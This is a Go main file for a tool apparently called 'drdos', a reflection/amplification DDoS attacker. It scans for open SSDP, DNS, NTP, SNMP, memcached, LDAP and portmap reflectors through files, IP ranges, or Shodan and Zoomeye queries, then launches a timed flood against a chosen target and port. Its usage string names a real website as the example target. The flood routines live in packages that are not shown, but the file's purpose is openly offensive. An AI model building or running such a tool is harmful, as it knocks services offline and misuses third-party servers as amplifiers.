package main

import (
	"context"
	"flag"
	"net"
	"strings"

	"drdos/config"
	"drdos/core"
	"drdos/core/api"
	"drdos/plugins"
	"drdos/utils"
)

func modeWarn() {
	utils.ColorPrint("Mode must be set...(a for attack, c for check)", "warn")
}

func usage() {
	utils.ColorPrint("Check mode:\n\tgo run main.go -m c -f test.txt --type xxx", "info")
	utils.ColorPrint("Atk	mode:\n\tgo run main.go -m a -f test.txt -t www.baidu.com -p 80 --type dns", "info")
}

func init() {
	utils.Initlog()
}

// 支持域名，然后解析
func main() {
	var (
		mode       string // 模式选择，是IP筛选，还是攻击，还是筛选加攻击
		ipaddress  string // target ip
		srcaddress string // src ip
		port       int    // target port
		atktype    string // 攻击类型
		interval   uint   // 发包间隔
		loadfile   string // IP列表
		timeout    uint   // 攻击时间超时
		iprange    string // 手动输入的IP范围
		apiquery   bool   // api模式
	)

	flag.StringVar(&mode, "m", "", "c(check)|a(attack)")
	flag.StringVar(&ipaddress, "t", "", "Target ip")
	flag.StringVar(&srcaddress, "s", "", "Source ip (use internal ip if using ECS -- like aliyun)")
	flag.IntVar(&port, "p", 80, "Target port")
	flag.StringVar(&atktype, "type", "", "Attack type (ssdp|dns|ntp|snmp|portmap|mem|ldap)")
	flag.UintVar(&interval, "i", 10000, "Interval(0 for attack, 10000 for check)")
	flag.StringVar(&loadfile, "f", "", "Vulnerable iplist path")
	flag.UintVar(&timeout, "timeout", 120, "Attack time")
	flag.StringVar(&iprange, "range", "", "IP range")
	flag.BoolVar(&apiquery, "api", false, "Get IP list from api")
	flag.Parse()

	err1 := utils.Dbinit()
	if err1 != nil {
		utils.ColorPrint("Db init error:"+err1.Error(), "err")
		return
	}
	utils.ColorPrint("Db init success", "success")

	// 黑名单校验
	if utils.IsContain(plugins.Blacklist, ipaddress) {
		utils.ColorPrint("IP not allowed by blacklist", "err")
		return
	}
	switch mode {
	case "c":
		var iplist []string
		var err error
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		utils.ColorPrint("Check mode start...", "info")
		switch {
		// 1. 判断是否从文件输入
		case loadfile != "":
			utils.ColorPrint("Loadfile from "+loadfile, "info")
			iplist, err = utils.FileLoads(loadfile)
			if err != nil {
				return
			}
		// 2. 判断是否从IP地址范围输入
		case iprange != "":
			if strings.Contains(iprange, "/") {
				iplist, err = utils.Hosts(iprange)
				if err != nil {
					utils.ColorPrint("wrong CIDR range"+loadfile, "err")
					return
				}
			} else {
				check := net.ParseIP(iprange)
				if check == nil {
					utils.ColorPrint("wrong IP address"+loadfile, "err")
					return
				}
				iplist = []string{iprange}
			}
		// 3. 判断是否从api输入
		case apiquery:
			switch {
			case config.ShodanApi != "":
				utils.ColorPrint("Shodan API searching", "info")
				for page := 1; page <= config.ShodanPage; page++ {
					tmplist, err := api.Shodan(utils.Typemap[atktype], uint(page))
					if err != nil {
						break
					}
					iplist = append(iplist, tmplist...)
				}
				utils.ColorPrint("Shodan API searching finished", "success")
				fallthrough
			case config.ZoomeyeApi != "":
				utils.ColorPrint("Zoomeye API searching", "info")
				for page := 1; page <= config.ZoomeyePage; page++ {
					tmplist, err := api.Zoomeye(utils.Typemap[atktype], page)
					if err != nil {
						break
					}
					iplist = append(iplist, tmplist...)
				}
				utils.ColorPrint("Zoomeye API searching finished", "success")
			}
			// 不同的搜索引擎可能会有重复的，这里做个去重操作
			iplist = utils.RemoveRepeatedElement(iplist)
		default:
			utils.ColorPrint("Error input", "err")
			return
		}

		_, err = core.Check(iplist, atktype, interval, srcaddress, ctx)
		if err != nil {
			utils.ColorPrint("Check Failed", "err")
		}

	// Attack模式
	/*
		目前只有从文件中Load
		现已更新sqlite部分，后续添加直接从sqlite加载
	*/
	case "a":
		utils.ColorPrint("Attack mode", "info")
		if ipaddress == "" || atktype == "" || loadfile == "" {
			utils.ColorPrint("Input error", "err")
			usage()
			return
		}
		if port > 65535 || port <= 0 {
			utils.ColorPrint("Port in range error", "warn")
			return
		}
		utils.ColorPrint("Loadfile from"+loadfile, "info")
		iplist, err := utils.FileLoads(loadfile)
		if err != nil {
			return
		}
		if interval == 10000 {
			interval = 0
		}
		err = core.Attack(iplist, ipaddress, atktype, port, interval, timeout)
		if err != nil {
			utils.ColorPrint("Attack error", "warn")
			return
		}
	case "h":
		utils.ColorPrint("HTTP service start...", "info")
		core.HttpMain()
	default:
		modeWarn()
	}
}
